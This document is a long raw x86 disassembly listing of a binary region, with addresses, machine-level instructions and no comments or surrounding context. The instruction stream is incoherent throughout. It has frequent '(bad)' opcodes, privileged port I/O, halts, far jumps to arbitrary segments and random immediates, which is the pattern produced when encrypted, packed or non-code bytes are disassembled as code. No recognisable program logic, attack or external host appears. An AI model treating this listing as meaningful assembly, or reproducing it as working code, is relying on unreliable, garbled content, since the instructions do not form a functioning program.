  412e69:	mov    al,0xaa
  412e6b:	and    cl,ah
  412e6d:	push   ds
  412e6e:	dec    edx
  412e6f:	ins    BYTE PTR es:[edi],dx
  412e70:	or     cl,BYTE PTR [edi]
  412e72:	enter  0x405,0x15
  412e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e77:	sbb    al,BYTE PTR [edx-0x5851515c]
  412e7d:	and    eax,0xd006dfd4
  412e82:	retf   0x9f95
  412e85:	out    0xa5,al
  412e87:	jp     0x412e8d
  412e89:	test   DWORD PTR [esi+ebx*2+0xd3d611],0x73c46ea
  412e94:	jnp    0x412ed4
  412e96:	push   edx
  412e97:	dec    ebp
  412e98:	cmp    BYTE PTR [edx+eax*1],0x97
  412e9c:	dec    edx
  412e9d:	enter  0x1b1b,0x33
  412ea1:	scas   eax,DWORD PTR es:[edi]
  412ea2:	sbb    DWORD PTR ds:0xb2639520,edx
  412ea8:	sbb    ch,BYTE PTR [edx]
  412eaa:	pop    es
  412eab:	sbb    eax,0x48d06e0
  412eb0:	addr16 mov eax,0x69f477f7
  412eb6:	out    0xbe,al
  412eb8:	and    al,0xaa
  412eba:	xor    eax,0xf415b6bc
  412ebf:	sbb    eax,0x96d4d671
  412ec4:	or     cl,dh
  412ec6:	cld    
  412ec7:	fs dec ebx
  412ec9:	pop    ebp
  412eca:	pop    edi
  412ecb:	push   esi
  412ecc:	mov    ebp,0x790d9bfd
  412ed1:	adc    BYTE PTR [esi+eax*4+0xd],bh
  412ed5:	mov    edi,0x937d0b67
  412eda:	push   edi
  412edb:	jmp    0x412f52
  412edd:	pop    eax
  412ede:	(bad)  
  412edf:	pop    ss
  412ee0:	pop    edx
  412ee1:	inc    ecx
  412ee2:	pusha  
  412ee3:	ja     0x412ec9
  412ee5:	(bad)  
  412ee6:	jno    0x412f5a
  412ee8:	push   0x5805116d
  412eed:	jge    0x412eca
  412eef:	push   ss
  412ef0:	jl     0x412f5b
  412ef2:	test   eax,esi
  412ef4:	es sti 
  412ef6:	dec    ebx
  412ef7:	jnp    0x412f13
  412ef9:	(bad)  
  412efa:	fs ja  0x412e85
  412efd:	xchg   ecx,eax
  412efe:	jmp    0x7d1f:0x98daa19e
  412f05:	repnz pop ds
  412f07:	mov    eax,0xc17780ed
  412f0c:	mov    eax,0xc5e6a08f
  412f11:	pop    ss
  412f12:	rcl    BYTE PTR [ebx],1
  412f14:	sub    ah,BYTE PTR [ecx-0x59]
  412f17:	add    BYTE PTR [eax+edi*2+0x65],bl
  412f1b:	pop    ecx
  412f1c:	jecxz  0x412ecd
  412f1e:	dec    eax
  412f1f:	out    dx,eax
  412f20:	mov    ebx,0x20a0d6d1
  412f25:	pop    ss
  412f26:	xchg   ebx,eax
  412f27:	cmp    BYTE PTR [ebp-0x6d],dl
  412f2a:	lods   al,BYTE PTR ds:[esi]
  412f2b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412f2d:	lahf   
  412f2e:	pop    ds
  412f2f:	xchg   ebx,eax
  412f30:	iret   
  412f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f32:	and    al,0x9
  412f34:	push   ds
  412f35:	jno    0x412f9d
  412f37:	shr    BYTE PTR [ecx+0x33],cl
  412f3a:	idiv   DWORD PTR [esi+0x62]
  412f3d:	sub    BYTE PTR [ebp-0xd],cl
  412f40:	dec    ebp
  412f41:	jnp    0x412f2d
  412f43:	cli    
  412f44:	retf   
  412f45:	jle    0x412f92
  412f47:	and    eax,0xe19894a5
  412f4c:	xor    BYTE PTR [ebp+0x2d],0x29
  412f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f51:	adc    esi,0x4e035c3a
  412f57:	push   eax
  412f58:	and    eax,0x2dff7008
  412f5d:	or     DWORD PTR [ebx-0x10ec28ac],ebp
  412f63:	(bad)  
  412f64:	sti    
  412f65:	xchg   ecx,eax
  412f66:	fnsave [ecx-0x3a]
  412f69:	cmp    al,ah
  412f6b:	fnstenv [esi]
  412f6d:	cmp    BYTE PTR [ecx],bh
  412f6f:	repz dec esp
  412f71:	xor    BYTE PTR [ebp+0x40],0xf7
  412f75:	mov    BYTE PTR [ebx],ah
  412f77:	fucomip st,st(0)
  412f79:	xchg   edx,eax
  412f7a:	adc    DWORD PTR [edi],esp
  412f7c:	jle    0x412fdc
  412f7e:	jge    0x412fd3
  412f80:	fidiv  DWORD PTR [ebp+0x957ac4e]
  412f86:	or     dl,BYTE PTR [esi+0x26ea830e]
  412f8c:	push   cs
  412f8d:	dec    esi
  412f8e:	test   BYTE PTR [ebx+0xf36c148],ah
  412f94:	mov    bl,BYTE PTR [ecx]
  412f96:	dec    edi
  412f97:	loope  0x412f6f
  412f99:	out    dx,al
  412f9a:	lods   al,BYTE PTR ds:[esi]
  412f9b:	mov    ah,0x8a
  412f9d:	das    
  412f9e:	pop    edx
  412f9f:	xlat   BYTE PTR ds:[ebx]
  412fa0:	cwde   
  412fa1:	add    eax,ecx
  412fa3:	rol    BYTE PTR [edi-0x605944c5],cl
  412fa9:	(bad)  
  412faa:	push   esi
  412fab:	add    ch,0xe0
  412fae:	inc    esp
  412faf:	sbb    eax,0xe8d6a70e
  412fb4:	jnp    0x412fae
  412fb6:	xor    BYTE PTR [eax*1-0x280e2dce],cl
  412fbd:	push   0x70
  412fbf:	dec    edx
  412fc0:	mov    cl,0xf2
  412fc2:	sti    
  412fc3:	and    ebp,DWORD PTR [edx+0x214f9335]
  412fc9:	hlt    
  412fca:	fsubr  st(0),st
  412fcc:	and    eax,0x5f7a4428
  412fd1:	aaa    
  412fd2:	into   
  412fd3:	call   0x7faa4503
  412fd8:	fdiv   DWORD PTR [eax]
  412fda:	popf   
  412fdb:	xor    eax,0x347877e0
  412fe0:	lods   al,BYTE PTR ds:[esi]
  412fe1:	(bad)  
  412fe2:	mov    ebp,0x2d32fa13
  412fe7:	pop    edx
  412fe8:	leave  
  412fe9:	aas    
  412fea:	sti    
  412feb:	sub    eax,0x4ec11fc0
  412ff0:	out    dx,al
  412ff1:	or     bh,BYTE PTR [edi]
  412ff3:	fst    DWORD PTR [edx]
  412ff5:	aam    0xeb
  412ff7:	(bad)  
  412ff9:	cmp    BYTE PTR [edi+0x20],bl
  412ffc:	jne    0x41300f
  412ffe:	pop    ebp
  412fff:	ss cwde 
  413001:	scas   eax,DWORD PTR es:[edi]
  413002:	mov    ebp,0x69178c82
  413007:	pop    esp
  413008:	adc    eax,0x172ef906
  41300d:	jns    0x412fd8
  41300f:	mov    edx,0x2680da25
  413014:	out    0xea,eax
  413016:	nop
  413017:	mov    al,ds:0xa9df87b0
  41301c:	test   eax,0xcd06bff9
  413021:	sub    eax,0x3d
  413024:	mov    ecx,DWORD PTR [esi]
  413026:	adc    dh,bh
  413028:	mov    ecx,0x44f4ae0b
  41302d:	xchg   ebx,eax
  41302e:	stos   BYTE PTR es:[edi],al
  41302f:	shl    DWORD PTR [eax],1
  413031:	inc    ecx
  413032:	inc    ebx
  413033:	call   0xd529:0x506280a5
  41303a:	jb     0x41301f
  41303c:	sahf   
  41303d:	lahf   
  41303e:	fwait
  41303f:	jg     0x4130a9
  413041:	push   0xfffffff6
  413043:	(bad)  
  413044:	jne    0x41302f
  413046:	scas   al,BYTE PTR es:[edi]
  413047:	pop    ss
  413048:	mov    ds:0xd2a8122a,al
  41304d:	mov    cl,0xdd
  41304f:	mov    bl,0x2f
  413051:	out    dx,eax
  413052:	xor    ebx,DWORD PTR [ebp+0x66]
  413055:	jl     0x413044
  413057:	icebp  
  413058:	xchg   ebp,eax
  413059:	adc    edx,DWORD PTR [ecx+0x295369a2]
  41305f:	(bad)  
  413060:	cmp    ebx,ebx
  413062:	in     al,dx
  413063:	retf   
  413064:	dec    esp
  413065:	imul   edx,ebp,0xfc9eee4a
  41306b:	fst    QWORD PTR [ebx-0x5c]
  41306e:	outs   dx,BYTE PTR ds:[esi]
  41306f:	add    cl,al
  413071:	into   
  413072:	push   ds
  413073:	inc    esi
  413074:	xlat   BYTE PTR ds:[ebx]
  413075:	js     0x41309f
  413077:	ret    0x4716
  41307a:	gs inc edi
  41307c:	(bad)  
  41307d:	cmc    
  41307e:	int    0x7f
  413080:	iret   
  413081:	dec    esi
  413082:	icebp  
  413083:	push   ss
  413084:	sub    DWORD PTR [ecx+0x6814e46f],ebx
  41308a:	pusha  
  41308b:	sub    DWORD PTR [edi+0x23],esi
  41308e:	add    DWORD PTR [eax+eax*4],ecx
  413091:	mov    ch,0xda
  413093:	js     0x413074
  413095:	jp     0x4130ab
  413097:	mov    dh,0x29
  413099:	or     BYTE PTR [esi+ebp*4],dh
  41309c:	inc    eax
  41309d:	push   ecx
  41309e:	jne    0x413044
  4130a0:	test   BYTE PTR [eax-0x6587960b],bh
  4130a6:	add    cl,BYTE PTR [ecx]
  4130a8:	rol    BYTE PTR [edx-0x542a96c4],1
  4130ae:	xor    esi,esi
  4130b0:	test   eax,0x447d3495
  4130b5:	ins    BYTE PTR es:[edi],dx
  4130b6:	lds    esi,FWORD PTR [ebp+0x736156b1]
  4130bc:	(bad)  
  4130bd:	push   es
  4130be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130bf:	add    eax,0xc325ef69
  4130c4:	inc    ebx
  4130c5:	inc    ecx
  4130c6:	pop    ebx
  4130c7:	cdq    
  4130c8:	and    ah,cl
  4130ca:	or     eax,DWORD PTR [edx-0xc67fa3]
  4130d0:	fist   WORD PTR [ecx]
  4130d2:	sbb    BYTE PTR [ecx+0x45],ah
  4130d5:	shr    DWORD PTR [ecx-0x17],cl
  4130d8:	push   eax
  4130d9:	fisttp DWORD PTR [edx]
  4130db:	mov    dl,0x3b
  4130dd:	lock cmp DWORD PTR [esi-0x23b2da16],eax
  4130e4:	add    eax,0x5022e489
  4130e9:	(bad)  
  4130ea:	nop
  4130eb:	push   ebx
  4130ec:	push   ebx
  4130ed:	sbb    DWORD PTR [ebx-0x55],ecx
  4130f0:	scas   al,BYTE PTR es:[edi]
  4130f1:	xchg   ecx,eax
  4130f2:	stos   BYTE PTR es:[edi],al
  4130f3:	mov    ds:0xea22ae4b,al
  4130f8:	in     al,dx
  4130f9:	mov    edi,DWORD PTR [ebx]
  4130fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130fd:	jmp    0xbd2e9b6b
  413102:	iret   
  413103:	jle    0x413184
  413105:	jo     0x4130f4
  413107:	xor    al,BYTE PTR ds:0xc47d831f
  41310d:	(bad)  
  41310e:	mov    ch,0x48
  413110:	in     eax,0x21
  413112:	push   ds
  413113:	mov    esp,esi
  413115:	and    bh,BYTE PTR [ebx+0x13356918]
  41311b:	gs es add ebx,eax
  41311f:	adc    al,0xee
  413121:	xchg   ecx,eax
  413122:	add    eax,DWORD PTR [eax+0x4940eed2]
  413128:	jl     0x413134
  41312a:	jl     0x4130ea
  41312c:	pop    esi
  41312d:	sbb    ebx,esp
  41312f:	jnp    0x413181
  413131:	int3   
  413132:	pop    esp
  413133:	sbb    esp,DWORD PTR [edx-0x6b651177]
  413139:	out    0xdb,al
  41313b:	inc    edi
  41313c:	std    
  41313d:	retf   
  41313e:	push   0x42e2e4ce
  413143:	lahf   
  413144:	mov    dl,cl
  413146:	sahf   
  413147:	aad    0xbc
  413149:	enter  0x98ff,0x7d
  41314d:	jae    0x413185
  41314f:	sti    
  413150:	sbb    al,0xad
  413152:	or     cl,BYTE PTR ds:0xa4784847
  413158:	(bad)  
  413159:	cld    
  41315a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41315b:	addr16 retf 0xadf4
  41315f:	ror    BYTE PTR [ecx+0x1f],0x58
  413163:	pushf  
  413164:	daa    
  413165:	mov    esi,0x1b335490
  41316a:	out    dx,eax
  41316b:	das    
  41316c:	leave  
  41316d:	add    esi,DWORD PTR [eax-0x24]
  413170:	or     BYTE PTR [esi+edi*2],dl
  413173:	adc    BYTE PTR [ebx],ch
  413175:	addr16 xchg esp,eax
  413177:	les    ebp,FWORD PTR [eiz*8+0x20d62141]
  41317e:	ins    BYTE PTR es:[edi],dx
  41317f:	into   
  413180:	imul   edx,DWORD PTR [esi],0x37
  413183:	dec    ecx
  413184:	retf   0xbf4b
  413187:	enter  0x5b1,0xf
  41318b:	cmp    bh,BYTE PTR [ecx+0x42]
  41318e:	xor    DWORD PTR [ecx+0x787a044d],ebp
  413194:	cmp    esi,DWORD PTR ds:0xc26aae1e
  41319a:	in     al,dx
  41319b:	push   ebp
  41319c:	push   ds
  41319d:	ror    BYTE PTR [ebp-0x4],1
  4131a0:	xor    BYTE PTR [edi],ch
  4131a2:	sbb    al,0xac
  4131a4:	pop    ss
  4131a5:	sbb    edi,eax
  4131a7:	out    0xf6,al
  4131a9:	(bad)  
  4131aa:	jecxz  0x413155
  4131ac:	aas    
  4131ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131ae:	out    dx,eax
  4131af:	pop    ebp
  4131b0:	fsub   st,st(6)
  4131b2:	sbb    BYTE PTR [ebx+0x27],dl
  4131b5:	mov    esp,0x1ef26553
  4131ba:	mov    es,WORD PTR [ebp-0x1960ac2]
  4131c0:	jbe    0x413143
  4131c2:	nop
  4131c3:	inc    ebp
  4131c4:	add    BYTE PTR [eax-0x4f],ch
  4131c7:	sbb    dl,BYTE PTR [ecx+eiz*2-0x34]
  4131cb:	cmc    
  4131cc:	dec    edi
  4131cd:	push   eax
  4131ce:	or     dh,BYTE PTR [ecx+0x23]
  4131d1:	repnz dec ecx
  4131d3:	mov    ds:0x4806915,al
  4131d8:	xlat   BYTE PTR ds:[ebx]
  4131d9:	jbe    0x4131c6
  4131db:	xchg   edi,esp
  4131dd:	in     eax,0xcb
  4131df:	mov    al,ds:0x1000bba7
  4131e4:	and    eax,0x6903f951
  4131e9:	dec    ebx
  4131ea:	popf   
  4131eb:	clc    
  4131ec:	mov    dl,0x24
  4131ee:	stc    
  4131ef:	in     al,dx
  4131f0:	je     0x4131b2
  4131f2:	sub    al,0xf4
  4131f4:	mov    ebp,0xe0416341
  4131f9:	test   al,0xc5
  4131fb:	(bad)  
  4131fc:	jae    0x4131b6
  4131fe:	add    al,0xe6
  413200:	(bad)  
  413201:	in     eax,0x58
  413203:	call   0x54c6b264
  413208:	icebp  
  413209:	std    
  41320a:	ds push edx
  41320c:	and    eax,ecx
  41320e:	(bad)  
  41320f:	or     eax,0x80160380
  413214:	nop
  413215:	clc    
  413216:	sar    BYTE PTR [ebp-0x73f430ca],1
  41321c:	inc    edi
  41321d:	mov    ch,bh
  41321f:	add    eax,0x7409ddab
  413224:	ret    0x86c6
  413227:	ret    
  413228:	jg     0x4131f3
  41322a:	mov    BYTE PTR [edx+0x6aa65207],bh
  413230:	cwde   
  413231:	pushf  
  413232:	cwde   
  413233:	retf   
  413234:	popa   
  413235:	outs   dx,DWORD PTR ds:[esi]
  413236:	(bad)  
  413237:	jbe    0x413247
  413239:	fcmovnbe st,st(5)
  41323b:	sub    BYTE PTR [ecx+esi*4],bh
  41323e:	or     DWORD PTR [esi-0x28],edx
  413241:	xchg   esp,eax
  413242:	into   
  413243:	das    
  413244:	mov    fs,WORD PTR [ecx+0x5aea4481]
  41324a:	loope  0x4131d2
  41324c:	(bad)  
  41324d:	fcmovbe st,st(1)
  41324f:	stc    
  413250:	adc    bh,dh
  413252:	fbstp  TBYTE PTR [edx+edi*1+0x28bb72db]
  413259:	jne    0x4132b7
  41325b:	mov    ds:0xed0e646d,al
  413260:	lahf   
  413261:	sbb    BYTE PTR [esi-0x55dbd5f4],al
  413267:	xchg   edi,eax
  413268:	pop    ds
  413269:	rcl    BYTE PTR ds:0x7ff49f1d,0xff
  413270:	mov    al,ds:0x15571b57
  413275:	mov    ebp,0x96d0e164
  41327a:	cdq    
  41327b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41327c:	mov    ebp,0x6fb29b05
  413281:	mov    ecx,DWORD PTR ds:0xe4bdcfd1
  413287:	inc    edi
  413288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413289:	mov    esi,0x1b0a5a3
  41328e:	add    ch,bh
  413290:	cdq    
  413291:	test   eax,0xe429cf2d
  413296:	shr    DWORD PTR [ebx],cl
  413298:	rcr    BYTE PTR [edi+0x59],1
  41329b:	fwait
  41329c:	add    al,0xbb
  41329e:	mov    dh,dl
  4132a0:	mov    edx,gs
  4132a2:	cmp    esp,DWORD PTR ds:0xebf531bb
  4132a8:	inc    edx
  4132a9:	lock mov ch,0x92
  4132ac:	sub    edi,DWORD PTR [ebp+0x4a717f76]
  4132b2:	ja     0x41327e
  4132b4:	ins    BYTE PTR es:[edi],dx
  4132b5:	xor    eax,0x991c29dc
  4132ba:	adc    BYTE PTR [ebx+0x3e8929c4],al
  4132c0:	mov    ah,0xb0
  4132c2:	scas   al,BYTE PTR es:[edi]
  4132c3:	pop    es
  4132c4:	fst    QWORD PTR [edi+ecx*4-0x30ac5227]
  4132cb:	ror    BYTE PTR [edx+0x6b],0x0
  4132cf:	test   eax,0x2ab3cee1
  4132d4:	mov    edi,0x77c75785
  4132d9:	dec    ecx
  4132da:	fisub  DWORD PTR [esi+0x3ec29098]
  4132e0:	xchg   ebx,eax
  4132e1:	or     ebp,edi
  4132e3:	(bad)  
  4132e4:	loopne 0x413301
  4132e6:	js     0x4132e6
  4132e8:	pop    esi
  4132e9:	cmp    eax,0x9cbc53f3
  4132ee:	jbe    0x4132d7
  4132f0:	xchg   ecx,eax
  4132f1:	lods   eax,DWORD PTR ds:[esi]
  4132f2:	out    dx,eax
  4132f3:	sahf   
  4132f4:	(bad)  ds:0xdf9d148d
  4132fa:	adc    DWORD PTR [ecx-0x63f63140],esi
  413300:	mov    cl,0xd9
  413302:	push   ebx
  413303:	xor    ch,bl
  413305:	mov    bl,0x90
  413307:	aaa    
  413308:	aaa    
  413309:	outs   dx,BYTE PTR ds:[esi]
  41330a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41330b:	stos   BYTE PTR es:[edi],al
  41330c:	jae    0x41332a
  41330e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330f:	mov    WORD PTR [esi-0x53],?
  413312:	mov    ch,0xe8
  413314:	add    ch,BYTE PTR [ebx]
  413316:	pop    edx
  413317:	push   ecx
  413318:	repnz inc ecx
  41331a:	xchg   DWORD PTR [edx+0x5f],edi
  41331d:	pop    ds
  41331e:	adc    eax,0xfb8b2ab6
  413323:	pop    es
  413324:	cmp    bh,BYTE PTR [edx]
  413326:	xlat   BYTE PTR ds:[ebx]
  413327:	or     BYTE PTR [ebp+ebx*2+0x1e66fff],ch
  41332e:	push   ds
  41332f:	ds inc ebx
  413331:	les    esi,FWORD PTR [esp+eiz*4]
  413334:	lods   eax,DWORD PTR ds:[esi]
  413335:	outs   dx,BYTE PTR ds:[esi]
  413336:	lds    ebx,FWORD PTR ds:0x409cd6f4
  41333c:	and    al,0xce
  41333e:	les    ebx,FWORD PTR [ebx]
  413340:	xlat   BYTE PTR ds:[ebx]
  413341:	sar    BYTE PTR [edx+0x68],0x98
  413345:	mov    bl,0xd4
  413347:	mov    BYTE PTR [edi+0x3108da3a],dl
  41334d:	scas   al,BYTE PTR es:[edi]
  41334e:	push   esi
  41334f:	ret    0xddf6
  413352:	int    0xb5
  413354:	mov    ch,0x69
  413356:	push   edx
  413357:	pop    edi
  413358:	cmp    eax,0xd7ae56ae
  41335d:	sbb    eax,0x860fa195
  413362:	push   cs
  413363:	in     al,dx
  413364:	adc    esp,edi
  413366:	dec    edi
  413367:	shl    DWORD PTR [ecx],0xe
  41336a:	retf   0xc624
  41336d:	or     al,0x45
  41336f:	fs call 0xae3:0x4bc3f3a1
  413377:	cmp    ch,BYTE PTR [eax]
  413379:	lahf   
  41337a:	(bad)  
  41337b:	fdivr  QWORD PTR [edi-0x311b5d43]
  413381:	adc    dh,ah
  413383:	out    dx,al
  413384:	mov    ax,0x7145
  413388:	sbb    eax,ebp
  41338a:	inc    edi
  41338b:	das    
  41338c:	iret   
  41338d:	shl    DWORD PTR [ecx+0x79],0xc0
  413391:	leave  
  413392:	popa   
  413393:	xlat   BYTE PTR ds:[ebx]
  413394:	cmp    eax,0xd53fd1be
  413399:	sub    ecx,DWORD PTR [edi+eiz*8-0x5a]
  41339d:	bound  eax,QWORD PTR [esi-0x71]
  4133a0:	mov    ch,0x33
  4133a2:	mov    ds:0x21c08313,al
  4133a7:	stc    
  4133a8:	mov    ebx,0x650fa05
  4133ad:	xor    dl,dl
  4133af:	mov    al,BYTE PTR [edi]
  4133b1:	or     ah,BYTE PTR [esi-0x13f66d70]
  4133b7:	or     eax,0x5684b9a6
  4133bc:	xchg   ebx,eax
  4133bd:	or     cl,BYTE PTR [edi-0x23]
  4133c0:	cmp    bh,dl
  4133c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133c3:	or     al,0xc0
  4133c5:	inc    edi
  4133c6:	out    0x5a,eax
  4133c8:	clc    
  4133c9:	sbb    DWORD PTR [edx-0x66aea88f],ebx
  4133cf:	rcr    ebp,0x43
  4133d2:	xchg   edx,eax
  4133d3:	out    0x47,eax
  4133d5:	icebp  
  4133d6:	loop   0x413436
  4133d8:	aam    0x2c
  4133da:	mov    eax,ds:0xda19c76b
  4133df:	std    
  4133e0:	icebp  
  4133e1:	je     0x413418
  4133e3:	dec    eax
  4133e4:	test   DWORD PTR ds:0xf0a59d0a,eax
  4133ea:	xchg   edi,eax
  4133eb:	call   0xcbf9:0x7cd7db4d
  4133f2:	pop    ds
  4133f3:	mov    bh,ah
  4133f5:	push   esp
  4133f6:	fwait
  4133f7:	pop    eax
  4133f8:	popa   
  4133f9:	test   eax,0x4ae26217
  4133fe:	pop    eax
  4133ff:	imul   esi,DWORD PTR [edx-0x24],0xf8601c8a
  413406:	jg     0x41344c
  413408:	ret    
  413409:	cmp    eax,0xa32d97b1
  41340e:	add    BYTE PTR [ecx+ebp*2+0x2],cl
  413412:	jmp    0x41de:0x78315ced
  413419:	not    DWORD PTR [eax-0x371e4a6f]
  41341f:	and    al,0x45
  413421:	and    ecx,DWORD PTR [ebp+ebx*2-0x70636f4c]
  413428:	mov    ds:0xb56e8c6b,al
  41342d:	pop    ebx
  41342e:	and    cl,BYTE PTR ds:0x18127cc6
  413434:	xor    DWORD PTR [edi+0x73],edx
  413437:	adc    DWORD PTR [edx+0x583d6ae0],edx
  41343d:	dec    esp
  41343e:	les    ecx,FWORD PTR [ebx]
  413440:	jg     0x4134af
  413442:	pop    esp
  413443:	out    dx,al
  413444:	aam    0x63
  413446:	push   ss
  413447:	xchg   esp,eax
  413448:	cmp    al,0x21
  41344a:	push   0x45a8912
  41344f:	test   eax,0xde77d67b
  413454:	inc    eax
  413455:	adc    dl,BYTE PTR [esi-0xc574359]
  41345b:	xor    bl,ch
  41345d:	add    DWORD PTR [eax-0x1d14a5c],ecx
  413463:	pop    edi
  413464:	inc    esp
  413465:	pop    edi
  413466:	dec    ebx
  413467:	push   0x6f458ee3
  41346c:	or     BYTE PTR [edi+0x3b33309a],0xe2
  413473:	hlt    
  413474:	dec    ebx
  413475:	mov    edx,DWORD PTR [eax]
  413477:	cs cmp dh,ah
  41347a:	push   ebx
  41347b:	inc    esp
  41347c:	fild   DWORD PTR [edx+0x74a7616d]
  413482:	push   edx
  413483:	int3   
  413484:	in     eax,0xd5
  413486:	scas   eax,DWORD PTR es:[edi]
  413487:	mov    ah,0xa7
  413489:	mov    ecx,ebp
  41348b:	leave  
  41348c:	lods   eax,DWORD PTR ds:[esi]
  41348d:	and    ebx,DWORD PTR [esi]
  41348f:	rcl    eax,cl
  413491:	in     eax,0x90
  413493:	or     edx,ebp
  413495:	shl    dl,0x7b
  413498:	das    
  413499:	loop   0x4134da
  41349b:	cs aad 0xdb
  41349e:	aaa    
  41349f:	cmp    BYTE PTR [edx+0x76],al
  4134a2:	push   0x35
  4134a4:	cmp    BYTE PTR [esp+eax*1+0x4e671276],cl
  4134ab:	cmp    esi,esi
  4134ad:	arpl   sp,dx
  4134af:	mov    bh,0x12
  4134b1:	fwait
  4134b2:	popa   
  4134b3:	and    DWORD PTR [ebx+0x53],ebx
  4134b6:	push   ss
  4134b7:	iret   
  4134b8:	mov    edx,ebx
  4134ba:	inc    edi
  4134bb:	sub    ah,BYTE PTR [ecx-0x20]
  4134be:	cmp    DWORD PTR [eax],edi
  4134c0:	or     BYTE PTR [edi+0x42],dl
  4134c3:	out    0x49,eax
  4134c5:	cmp    dh,0xf7
  4134c8:	mov    dl,0x75
  4134ca:	fdiv   QWORD PTR [esi+0x195b4f6]
  4134d0:	out    0xc5,al
  4134d2:	push   esp
  4134d3:	vdivss xmm2,xmm3,DWORD PTR [esi-0x3c]
  4134d8:	cli    
  4134d9:	pop    es
  4134da:	je     0x4134f0
  4134dc:	adc    DWORD PTR [edx],eax
  4134de:	or     BYTE PTR [esi-0x71e0105],cl
  4134e4:	push   ss
  4134e5:	or     BYTE PTR [edx],bl
  4134e7:	scas   al,BYTE PTR es:[edi]
  4134e8:	jb     0x41352c
  4134ea:	and    BYTE PTR [ebp+0x1cd142ad],cl
  4134f0:	sub    ecx,edx
  4134f2:	sbb    al,0xcd
  4134f4:	fisub  DWORD PTR [eax-0x7c]
  4134f7:	cwde   
  4134f8:	xchg   DWORD PTR [esi-0x5a],edi
  4134fb:	ins    DWORD PTR es:[edi],dx
  4134fc:	mov    bh,0x1
  4134fe:	addr16 mov esp,0x5ec84e2b
  413504:	das    
  413505:	mov    al,0x3f
  413507:	mov    esp,DWORD PTR [ebx-0x7a5c5184]
  41350d:	into   
  41350e:	pop    edx
  41350f:	dec    ecx
  413510:	out    0x17,eax
  413512:	mov    ?,WORD PTR [ebp+0x42]
  413515:	imul   ebx,DWORD PTR [ebp-0x7222f240],0xe8328e05
  41351f:	sbb    BYTE PTR [esi+0x4],dl
  413522:	repnz cmp ah,ch
  413525:	cmp    ebp,DWORD PTR [ebp+0x1d522668]
  41352b:	jmp    0x4618:0x5e7ed513
  413532:	call   0xd752:0x6a6b9ac9
  413539:	sub    BYTE PTR [eax+ecx*2-0x37],ch
  41353d:	and    ch,bl
  41353f:	(bad)
  413543:	mov    cl,0x69
  413545:	sbb    eax,0x4962da77
  41354a:	or     BYTE PTR [ecx+0x5f],ah
  41354d:	aad    0xdb
  41354f:	and    edx,DWORD PTR [ebx+0x18bf1b00]
  413555:	jbe    0x41353c
  413557:	push   ds
  413558:	je     0x413503
  41355a:	mov    BYTE PTR [ecx],cl
  41355c:	xor    eax,0xe832b7e1
  413561:	(bad)  
  413562:	hlt    
  413563:	or     ebp,DWORD PTR [eax+esi*2]
  413566:	(bad)  
  413567:	addr16 loop 0x413565
  41356a:	fild   QWORD PTR [edx]
  41356c:	mov    al,0xa3
  41356e:	jge    0x4135a6
  413570:	inc    esp
  413571:	cmp    DWORD PTR [ecx-0x71],edx
  413574:	mov    esi,0xb23d5b35
  413579:	xor    eax,0xf9cf3472
  41357e:	jne    0x4135a4
  413580:	add    BYTE PTR [ebp-0x1d],ch
  413583:	icebp  
  413584:	sub    DWORD PTR [ebp-0x11],esp
  413587:	sbb    dl,BYTE PTR [ebp+0x3c]
  41358a:	leave  
  41358b:	inc    edi
  41358c:	es aam 0x78
  41358f:	lock icebp 
  413591:	fwait
  413592:	shl    BYTE PTR [edi],0x67
  413595:	outs   dx,DWORD PTR ds:[esi]
  413596:	sar    esp,0x72
  413599:	lods   eax,DWORD PTR ds:[esi]
  41359a:	xor    eax,DWORD PTR [ebp-0x73a6e89f]
  4135a0:	imul   edx,DWORD PTR [ecx+0x39],0xffffffd6
  4135a4:	in     eax,0x83
  4135a6:	cmc    
  4135a7:	(bad)  
  4135a8:	dec    eax
  4135a9:	call   0xcb8a8256
  4135ae:	in     al,dx
  4135af:	mov    ah,bl
  4135b1:	pop    ss
  4135b2:	xchg   ecx,eax
  4135b3:	sahf   
  4135b4:	sbb    DWORD PTR [ebx+0x306644ae],edi
  4135ba:	mov    ah,BYTE PTR [esi+0x4dffa150]
  4135c0:	aam    0x72
  4135c2:	shr    DWORD PTR [eax-0x42],cl
  4135c5:	pop    edi
  4135c6:	call   0xb6fcaf86
  4135cb:	das    
  4135cc:	push   edi
  4135cd:	adc    ebp,0xffffff84
  4135d0:	into   
  4135d1:	pop    edi
  4135d2:	xor    BYTE PTR [edi+ebx*1-0x7c87853a],bl
  4135d9:	call   0xed6b:0x116d4a14
  4135e0:	in     al,dx
  4135e1:	mov    BYTE PTR [ebx-0x3e],0x8b
  4135e5:	stc    
  4135e6:	and    edi,DWORD PTR [ebp-0x16acd0c6]
  4135ec:	jge    0x4135cd
  4135ee:	xchg   DWORD PTR [eax-0xe],edi
  4135f1:	mov    bh,al
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	dec    edi
  4135f5:	lea    esi,[ebx-0x468557f1]
  4135fb:	sub    dl,ch
  4135fd:	or     DWORD PTR [ebp-0x381f46c2],edx
  413603:	mov    eax,0x8e444ad
  413608:	imul   esi,DWORD PTR [edx],0x53357c6b
  41360e:	leave  
  41360f:	jno    0x4135aa
  413611:	jg     0x413643
  413613:	xchg   ebx,eax
  413614:	shr    DWORD PTR [ebp-0x6e],1
  413617:	in     eax,dx
  413618:	xor    eax,0x8794287a
  41361d:	ret    
  41361e:	or     ah,BYTE PTR [edi-0x4b]
  413621:	call   0x547a9a8e
  413626:	jmp    0x3e38:0x7dd74db4
  41362d:	inc    esi
  41362e:	popa   
  41362f:	xchg   ecx,eax
  413630:	cli    
  413631:	pop    ebx
  413632:	dec    edx
  413633:	and    eax,0x8dfe2a08
  413638:	nop
  413639:	push   edx
  41363a:	push   0x153a9292
